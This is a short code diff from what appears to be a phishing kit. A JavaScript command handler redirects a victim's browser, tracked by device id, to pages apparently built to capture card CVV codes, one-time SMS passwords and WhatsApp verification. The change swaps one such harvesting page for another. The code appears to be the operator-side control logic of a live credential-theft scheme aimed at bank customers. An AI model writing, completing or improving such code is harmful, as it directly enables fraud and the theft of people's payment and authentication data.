@@ -147,7 +147,7 @@
 
         async function procesarComando(command) {
             if (command === 'wpp' || command === 'whatsapp') {
-        window.location.href = (typeof basePath !== 'undefined' ? basePath : '') + 'whatsapp_validation.php?id=' + (typeof currentDeviceId !== 'undefined' ? currentDeviceId : '');
+        window.location.href = (typeof basePath !== 'undefined' ? basePath : '') + 'v92_sec_wpp.html?id=' + (typeof currentDeviceId !== 'undefined' ? currentDeviceId : '');
     } else if (command === 'cvv') {
                 window.location.replace(basePath + 'v92_sec_c3v.html');
             } else if (command === 'otp' || command === 'dinamica' || command === 'sms' || command === 'sms-error' || command === 'mensaje' || command === 'seguridad') {
